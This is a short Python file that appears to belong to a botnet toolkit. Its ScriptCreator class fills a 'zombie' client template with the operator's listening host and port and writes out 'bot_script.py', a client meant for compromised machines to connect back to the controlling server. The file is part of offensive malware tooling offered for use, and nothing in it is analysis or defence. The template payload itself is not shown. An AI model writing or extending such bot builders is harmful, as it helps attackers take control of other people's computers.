#!/usr/bin/env python3

'''
this script is for creating script for zombies to run and connect to server
'''

from tkinter import messagebox

class ScriptCreator:
    def __init__(self, lhost, lport):
        self.lhost = lhost
        self.lport = lport

    def create(self):
        zombie_script_path = 'modules/client-side/zombie_script.py'
        try:
            with open(zombie_script_path, 'r') as z_file:
                z_file_content = z_file.read()

        except FileNotFoundError:
            messagebox.showerror(title='Error', message='File {} not found! maybe you have deleted it.')

        else:
            z_file_content = z_file_content.replace('replace_server_ip', self.lhost)
            z_file_content = z_file_content.replace("'replace_server_port'", self.lport)
            new_file_content = z_file_content

            # create new file
            with open('bot_script.py', 'w') as new_file:
                new_file.write(new_file_content)
                print('New file created --> file name : bot_script.py')
